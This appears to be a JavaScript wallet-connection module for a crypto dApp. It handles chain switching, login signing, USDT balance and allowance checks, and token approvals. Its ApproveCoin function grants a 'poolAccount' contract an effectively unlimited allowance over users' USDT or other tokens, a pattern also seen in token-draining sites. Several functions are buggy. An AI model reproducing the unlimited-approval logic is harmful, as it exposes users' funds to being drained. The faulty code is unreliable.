import { showToast } from 'vant';
import 'vant/es/toast/style';
import { ethers } from "ethers";
import { Provider, Web3Provider } from "@ethersproject/providers"
import { useAddrStore } from '../store/user'
import { USDTcontractAddress, USDTcontractABI, LOGINcontractAddress, LTCcontractAddress, rechargeABI, poolAccount, XIERcontractABI } from "./constants";
import { storeToRefs } from 'pinia'
import { networkConfig } from '../../config/networkConfig';
import tp from "tp-js-sdk";
const store = useAddrStore()
const { address } = storeToRefs(store)

export async function getProvider() {
  // const { ethereum } = window;
  const provider = new Web3Provider(window.ethereum)
  return provider;
};

export async function createUSDTContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const USDTTransactionsContract = new ethers.Contract(USDTcontractAddress, USDTcontractABI, signer);
  return USDTTransactionsContract;
};

export async function createCCContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(LOGINcontractAddress, XIERcontractABI, signer);
  return TransactionsContract;
};

export async function createLTCContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(LTCcontractAddress, USDTcontractABI, signer);
  return TransactionsContract;
};

export async function createRechargeContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(poolAccount, rechargeABI, signer);
  return TransactionsContract;
};

export async function sign() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const result = await signer.signMessage(`Authorize Login`, address.value, 'Authorize');
  return result;
};

/**
 * 判断是否为观察钱包(TP)
 * @param
*/
export async function isWatchWallet() {
  const {data} = await tp.getCurrentWallet();
  const result = data.walletType == 'observeWallet';
  return result;
};

/**
 * 获取USDT余额
 * @returns balance
 */
export async function balance() {
  let MyContract = await createUSDTContract()
  let balance = await MyContract.balanceOf(address.value)
  balance = Number(ethers.utils.formatEther(balance.toString())).toFixed(4)
  return balance;
};

/**
 * @description: 大数据处理使用ethers
 * @param {*} amount
 * @param {*} tokenDecimals
 * @return {*}
 */
export async function toAmount(amount, tokenDecimals = 18) {
  return ethers.utils.parseEther(amount.toString(), tokenDecimals).toString();
}

//查询代币价格
export async function getCoinPrice() {
  let MyContract = await createUSDTContract()
  let price = await MyContract.price()
  price = Number(ethers.utils.formatEther(price.toString())).toFixed(4)
  return price;
};

/**
 * 查询授权额度
 * @param {代币类型} cointype 1USDT 2其他代币
 */
export async function allowance(cointype) {
  let status = null
  try {
    let MyContract = cointype == 1 ? await createUSDTContract() : await createLTCContract()
    await MyContract.allowance(address.value, poolAccount).then(
      res => {
        let n = Number(ethers.utils.formatEther(res.toString()));
        console.log("授权数量==", n);
        status = n > 0
        // this.approveFlag = n > 0;
      })
    return status
  } catch (error) {
    // this.allowanceBalance = 0;
    console.error("trigger smart contract error", error)
    showToast('上链失败~')
    return false
  }
}

/**
 * 代币授权
 * @param {代币类型} cointype 1USDT 2其他代币
 */
export async function ApproveCoin(cointype, cb) {
  let from = await createUSDTContract()
  let to = await createRechargeContract()
  from = cointype == 1 ? await createUSDTContract() : await createLTCContract()
  from.allowance(address.value, to.address).then(r => {
    if (r <= 1) {
      console.error('>>>>>>>>>>>>>>>>>>>', from, to.address);
      from.approve(to.address, "100000000000000000000000000000000").then((res) => {
        console.error("success1");
        cb && cb(res)
      }).catch(err => {
        console.error("err", err);
        cb && cb(false)
      })
    } else {
      console.error("success2");
      cb && cb(false)
    }
  }).catch(err => {
    console.error('...............', err);
    cb && cb(false)
  })
}

/**
 * @description: 获取chainid
 * @param {*}
 * @return {*}
 */
async function getChainId() {
  const { ethereum } = window;
  try {
    const chainId = await ethereum.request({
      method: "eth_chainId"
    });
    handleNewChain(chainId);
  } catch (err) {
    console.error(err);
  }
}

export function connetWallet() {
  return new Promise(async (resolve, reject) => {
    const { ethereum } = window;
    try {
      if (ethereum) {
        if (typeof ethereum.isTokenPocket !== 'undefined') {
          console.log('TokenPocket Extension is installed!');
        }
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
        await getChainId(); //获取chanid参数
        await _listeningMetamsk();
        // await updateAccount(accounts[0])// 执行登录操作
        resolve(accounts[0]);
      } else {
        reject();
        showToast('请在区块链浏览器打开~')
      }
    } catch (err) {
      reject();
      showToast('请在区块链浏览器打开~')
    }
  })
};

/**
 * @description: 切换到对应网络
 * @param {*}
 * @return {*}
 */
async function switchToEthereum() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [
        {
          chainId: networkConfig.chain.Id
        }
      ]
    });
  } catch (error) {
    console.log(error)
    if (error.code === 4902) {
      switchToOtherNetwork()
    } else if (error.code === 4001) return
  }
}

/**
 * @description: 添加并主动切换到其余链配置
 * @param {*} findChain
 * @return {*}
 */
async function switchToOtherNetwork(findChain) {
  try {
    await window.ethereum.request({
      method: "wallet_addEthereumChain",
      params: [
        {
          chainId: networkConfig.chain.Id,
          chainName: networkConfig.chain.name,
          nativeCurrency: networkConfig.chain.nativeCurrency,
          rpcUrls: networkConfig.chain.rpcUrls,
          blockExplorerUrls: networkConfig.chain.blockExplorerUrls
        },
      ] // [{XXXXX}]  is Array
    });
  } catch (error) {
    console.log(error);
  }
}

/**
 * @description: switch or add rpcNetwork
 * @param {*} id chan_id（16）
 * @return {*}
 */
export async function switchNetwork(id) {
  let findChain = nativeMetamaskMap.find(v => v.chainId === id);
  if (!window.ethereum) {
    showToast('Please install metamsk')
    return;
  }
  // 若DAPP支持多网络时开启此功能
  // if (!findChain) {
  //   showToast('The current website does not support the chain')
  //   return;
  // }
  if (id === networkConfig.chain.Id) {
    // switchToEthereum();
  } else {
    switchToEthereum(findChain);
  }
}


/**
 * @description: matemask config
 * @param {*}
 * @return {*}
 */
export const nativeMetamaskMap = [
  {
    chainId: "0x1",
    chainName: "Ethereum Mainnet",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18
    },
    rpcUrls: ["https://mainnet.infura.io/v3/"],
    blockExplorerUrls: ["https://etherscan.io/"]
  },
  {
    chainId: "0x80",
    chainName: "huobi Network",
    nativeCurrency: {
      name: "HT",
      symbol: "HT",
      decimals: 18
    },
    rpcUrls: ["https://http-mainnet-node.huobichain.com"],
    blockExplorerUrls: ["https://hecoinfo.com"]
  },
  {
    chainId: "0x38",
    chainName: "Binance Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com/"]
  },
  {
    chainId: "0x61",
    chainName: "BSC-Test-Network",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18
    },
    rpcUrls: ["https://data-seed-prebsc-2-s3.binance.org:8545"],
    blockExplorerUrls: ["https://testnet.bscscan.com"]
  },
  {
    chainId: "0x539",
    chainName: "Local-Test-Network",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18
    },
    rpcUrls: ["https://mainnet.infura.io/v3/"],
    blockExplorerUrls: ["https://etherscan.io/"]
  }
];

/**
 * @description: handelConnectInfo
 * @param {*} info
 * @return {*}
 */
async function handelConnectInfo(info) {
  console.log(info, "handelConnectInfo");
  if (info.chainId == networkConfig.chain.Id) {
    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    await updateAccount(accounts[0])
  }
}

/**
 * @description: handleDisConnect
 * @param {*} disconnect
 * @return {*}
 */
function handleDisConnect(disconnect) {
  console.log(disconnect, "handleDisConnect");
}

/**
 * @description: handleNewAccount
 * @param {*} account
 * @return {*}
 */
function handleNewAccount(account) {
  console.log('handleNewAccount', account[0]);
  updateAccount(account[0]);
}

/**
 * @description: handleNewChain
 * @param {*} account
 * @return {*}
 */
function handleNewChain(chain) {
  switchNetwork(chain)
}

/**
 * 
 */
async function updateAccount(account) {
  if (account && account.length === 42) {
    // 执行登录操作
    await store.loginaddr(account)
  }
}

/**
 * @description: handelNewMessage
 * @param {*} msg
 * @return {*}
 */
function handelNewMessage(msg) {
  console.log(msg, "handelNewMessage");
  const { ethereum } = window;
  if (!ethereum) return showToast('请在区块链浏览器打开~');
  const params = res?.data?.data?.data?.params;
  console.log(params)
  updateAccount(params[0])
  // 执行登录操作
  if (params && params.chainId) {
    if (params.chainId !== networkConfig.chain.Id) {
      switchToEthereum()
    }
  }
}

/**
 * @description: 监听链上钱包配置
 * @param {*}
 * @return {*}
 */
function _listeningMetamsk() {
  const { ethereum } = window;

  ethereum.on("chainChanged", handleNewChain);

  ethereum.on("accountsChanged", handleNewAccount);

  ethereum.on("message", handelNewMessage);

  ethereum.on("connect", handelConnectInfo);

  ethereum.on("disconnect", handleDisConnect);
}


function throttle(fn, delay) {
  var timer = null;
  return function () {
    clearTimeout(timer);
    timer = setTimeout(function () {
      fn();
    }, delay);
  }
}

//监听PC端账号切换
// window.addEventListener('message', res => {
//   const { ethereum } = window;
//   if (!ethereum) return showToast('请在区块链浏览器打开~');
//   const params = res?.data?.data?.data?.params;
//   console.log(params)
//   if (params && params[0] && params[0].length === 42) {
//     store.loginaddr(params[0])
//     // pubsub.publish('changeAccount',params[0]);
//     // 执行登录操作
//   }
//   if (params && params.chainId) {
//     if (params.chainId !== networkConfig.chain.Id) {
//       switchToEthereum()
//       // switchToOtherNetwork()
//     }
//   }
// });